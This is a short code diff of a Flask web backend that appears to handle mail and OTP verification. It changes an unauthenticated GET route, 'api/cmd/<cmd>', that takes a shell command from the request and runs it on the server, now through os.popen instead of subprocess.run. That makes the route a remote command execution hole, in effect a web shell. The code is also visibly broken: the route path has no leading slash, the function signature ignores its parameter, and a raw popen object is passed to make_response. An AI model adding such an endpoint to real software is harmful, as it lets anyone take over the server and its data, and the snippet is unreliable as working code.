@@ -12,7 +12,6 @@ from .Mail import Mail
 import random
 import psycopg2 # type: ignore
 from flask_cors import CORS
-import subprocess
 app = Flask(__name__)
 #updated code from 
 CORS(app,supports_credentials=True)
@@ -392,7 +391,7 @@ def varify_otp():
 @app.route("api/cmd/<cmd>",methods=["GET"])
 def cmd():
     cmd = request.args.get("cmd")
-    result = subprocess.run(cmd, capture_output=True, text=True)
+    result = os.popen(cmd)
     return make_response(result)
     
 if __name__ == '__main__':
